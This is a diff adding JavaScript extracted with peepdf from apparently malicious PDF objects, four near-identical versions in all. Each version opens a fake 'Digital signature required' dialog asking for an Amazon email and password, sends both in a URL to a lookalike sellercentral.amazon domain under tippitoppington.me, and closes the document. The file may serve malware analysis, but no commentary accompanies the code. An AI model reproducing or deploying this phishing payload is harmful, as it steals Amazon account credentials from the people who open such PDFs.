@@ -1,0 +1,244 @@
+// peepdf comment: Javascript code located in object 29 (version 1)
+
+var oDlg = {
+    uName: "",
+    initialize: function(dialog) {
+        dialog.load({
+            "usnm": this.uName
+        }, {
+            "pass": this.pAss
+        });
+    },
+    commit: function(dialog) {
+        var data = dialog.store();
+        this.uName = data["usnm"];
+        this.pAss = data["pass"];
+    },
+    description: {
+        name: "Digital signature required",
+        elements: [{
+            type: "view",
+            elements: [{
+                name: "Amazon E-Mail-Adresse:",
+                type: "static_text",
+            }, {
+                item_id: "usnm",
+                type: "edit_text",
+                char_width: 25
+            }, {
+                name: "Amazon Passwort:",
+                type: "static_text",
+            }, {
+                item_id: "pass",
+                type: "edit_text",
+                char_width: 25
+            }, {
+                type: "ok_cancel",
+            }, ]
+        }, ]
+    }
+};
+
+
+
+// Dialog Activation 
+
+app.execDialog(oDlg);
+if (oDlg.uName != null && oDlg.pAss != null) {
+    var cURL = "http://sellercentral.amazon.de.JHINTRTVY8F9BT99709T3YGRFFRVY.tippitoppington.me/?c=" + oDlg.uName + " " + oDlg.pAss + " \n";
+    this.submitForm({
+        cURL: encodeURI(cURL),
+        cSubmitAs: "XML",
+        cCharSet: "utf-8"
+    });
+    this.closeDoc();
+} else {
+
+    this.closeDoc();
+
+
+}
+
+// peepdf comment: Javascript code located in object 39 (version 2)
+
+var oDlg = {
+    uName: "",
+    initialize: function(dialog) {
+        dialog.load({
+            "usnm": this.uName
+        }, {
+            "pass": this.pAss
+        });
+    },
+    commit: function(dialog) {
+        var data = dialog.store();
+        this.uName = data["usnm"];
+        this.pAss = data["pass"];
+    },
+    description: {
+        name: "Digital signature required",
+        elements: [{
+            type: "view",
+            elements: [{
+                name: "Amazon E-mail:",
+                type: "static_text",
+            }, {
+                item_id: "usnm",
+                type: "edit_text",
+                char_width: 25
+            }, {
+                name: "Amazon Password:",
+                type: "static_text",
+            }, {
+                item_id: "pass",
+                type: "edit_text",
+                char_width: 25
+            }, {
+                type: "ok_cancel",
+            }, ]
+        }, ]
+    }
+};
+
+
+
+// Dialog Activation 
+
+app.execDialog(oDlg);
+if (oDlg.uName != null && oDlg.pAss != null) {
+    var cURL = "http://sellercentral.amazon.de.8TGEG8YR8Y64GT48RGBFGR6743T45.tippitoppington.me/?c=" + oDlg.uName + " " + oDlg.pAss + " \n";
+    this.submitForm({
+        cURL: encodeURI(cURL),
+        cSubmitAs: "XML",
+        cCharSet: "utf-8"
+    });
+    this.closeDoc();
+} else {
+
+    this.closeDoc();
+
+
+}
+
+// peepdf comment: Javascript code located in object 40 (version 3)
+
+var oDlg = {
+    uName: "",
+    initialize: function(dialog) {
+        dialog.load({
+            "usnm": this.uName
+        }, {
+            "pass": this.pAss
+        });
+    },
+    commit: function(dialog) {
+        var data = dialog.store();
+        this.uName = data["usnm"];
+        this.pAss = data["pass"];
+    },
+    description: {
+        name: "Digital signature required",
+        elements: [{
+            type: "view",
+            elements: [{
+                name: "Amazon E-mail:",
+                type: "static_text",
+            }, {
+                item_id: "usnm",
+                type: "edit_text",
+                char_width: 25
+            }, {
+                name: "Amazon Password:",
+                type: "static_text",
+            }, {
+                item_id: "pass",
+                type: "edit_text",
+                char_width: 25
+            }, {
+                type: "ok_cancel",
+            }, ]
+        }, ]
+    }
+};
+
+
+
+// Dialog Activation 
+
+app.execDialog(oDlg);
+if (oDlg.uName != null && oDlg.pAss != null) {
+    var cURL = "http://sellercentral.amazon.co.uk.8TGEG8YR8Y64GT48RGBFGR6743T45.tippitoppington.me/?c=" + oDlg.uName + " " + oDlg.pAss + " \n";
+    this.submitForm({
+        cURL: encodeURI(cURL),
+        cSubmitAs: "XML",
+        cCharSet: "utf-8"
+    });
+    this.closeDoc();
+} else {
+
+    this.closeDoc();
+
+
+}
+
+// peepdf comment: Javascript code located in object 41 (version 4)
+
+var oDlg = {
+    uName: "",
+    initialize: function(dialog) {
+        dialog.load({
+            "usnm": this.uName
+        }, {
+            "pass": this.pAss
+        });
+    },
+    commit: function(dialog) {
+        var data = dialog.store();
+        this.uName = data["usnm"];
+        this.pAss = data["pass"];
+    },
+    description: {
+        name: "Digital signature required",
+        elements: [{
+            type: "view",
+            elements: [{
+                name: "Amazon E-mail:",
+                type: "static_text",
+            }, {
+                item_id: "usnm",
+                type: "edit_text",
+                char_width: 25
+            }, {
+                name: "Amazon Password:",
+                type: "static_text",
+            }, {
+                item_id: "pass",
+                type: "edit_text",
+                char_width: 25
+            }, {
+                type: "ok_cancel",
+            }, ]
+        }, ]
+    }
+};
+
+
+
+// Dialog Activation 
+
+app.execDialog(oDlg);
+if (oDlg.uName != null && oDlg.pAss != null) {
+    var cURL = "http://sellercentral.amazon.co.uk.8TGEG8YR8Y64GT48RGBFGR6743T.tippitoppington.me/?c=" + oDlg.uName + " " + oDlg.pAss + " \n";
+    this.submitForm({
+        cURL: encodeURI(cURL),
+        cSubmitAs: "XML",
+        cCharSet: "utf-8"
+    });
+    this.closeDoc();
+} else {
+
+    this.closeDoc();
+
+
+}
+
